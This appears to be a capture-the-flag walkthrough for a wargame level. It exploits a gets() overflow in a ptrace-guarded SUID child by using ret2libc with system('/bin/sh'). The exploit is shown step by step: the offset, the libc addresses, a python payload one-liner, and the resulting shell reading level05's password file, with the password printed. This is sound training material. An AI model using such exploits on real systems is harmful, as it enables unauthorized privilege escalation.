# Level 04 - Practical walkthrough

> 🔓 **Flaw:** `gets()` stack overflow in a `ptrace`-guarded child
> 🎯 **Target:** the saved return address (EIP) of the child's `main`
> 🛠️ **Technique:** ret2libc - the parent's `ptrace` blocks `execve`, so we call `system("/bin/sh")`, whose grandchild does the exec unseen.

All commands are run as user `level04`. This binary is **32-bit** (libc addresses are
the same ones we used in level01).

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and behaviour.

🟨 **Terminal:**

```bash
ls -l ./level04
./level04
```

⬜ **Output:**

```text
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
Give me some shellcode, k
AAAA
child is exiting...
```

Owned by `level05` and SUID. It asks for "shellcode", reads a line, then exits.

## 2. Understand the anti-exec guard

🟦 **Goal:** see why plain shellcode won't work.

🟨 **Terminal:**

```bash
gdb ./level04
```

🟨 **GDB:**

```gdb
disassemble main
```

Reconstructing `main`:

- It `fork`s. The **child** runs `gets(buffer)` - an unbounded read into a 32-byte buffer.
- The **parent** loops on `ptrace(PTRACE_PEEKUSR, child, 44, 0)`, reading the child's
  `ORIG_EAX` (the attempted syscall number). If it ever equals **11** (`execve`), the parent
  prints `no exec() for you` and kills the child.

So injecting execve shellcode is caught. Instead we return into libc: `system("/bin/sh")`
internally `fork`s a **grandchild** that performs the exec - and the parent only traces our
direct child, not the grandchild.

## 3. Find the EIP offset

🟦 **Goal:** measure the overflow offset. Because `gets` runs in the child, tell gdb to
follow the child.

🟨 **GDB:**

```gdb
set follow-fork-mode child
run
```

🟨 **In the program:** (paste a cyclic pattern)

```text
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A
```

⬜ **Output:**

```text
Program received signal SIGSEGV, Segmentation fault.
0x41326641 in ?? ()
```

`0x41326641` = `"Af2A"`. Find it in the pattern:

🟨 **Terminal:**

```bash
python -c "
import struct
pat='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A'
print(pat.find(struct.pack('<I', 0x41326641).decode()))
"
```

⬜ **Output:**

```text
156
```

The saved return address is reached after **156 bytes**.

## 4. Find the libc addresses

🟦 **Goal:** collect `system`, `exit`, and `"/bin/sh"` for the ret2libc frame.

🟨 **GDB:**

```gdb
print system
print exit
find __libc_start_main, +99999999, "/bin/sh"
```

⬜ **Output:**

```text
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
0xf7f897ec
```

- `system` = `0xf7e6aed0`
- `exit`   = `0xf7e5eb70`
- `"/bin/sh"` = `0xf7f897ec`

## 5. Build and run the exploit

🟦 **Goal:** overflow with 156 bytes, then a ret2libc frame calling `system("/bin/sh")`.

```text
[ "A" * 156 ] [ &system ] [ &exit ] [ &"/bin/sh" ]
```

🟨 **Terminal:**

```bash
(python -c "print 'A' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'"; cat) | ./level04
```

🟨 **In the shell:**

```bash
whoami
cat /home/users/level05/.pass
```

⬜ **Output:**

```text
level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

> Alternative (harder) route: write custom shellcode that uses only `open`/`read`/`write`
> (no `execve`) to print `/home/users/level05/.pass`, drop it in an environment variable
> behind a NOP sled, and return to it. It bypasses the guard too, but ret2libc is cleaner.

## 6. Move to the next level

🟨 **Terminal:**

```bash
su level05
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level05
```
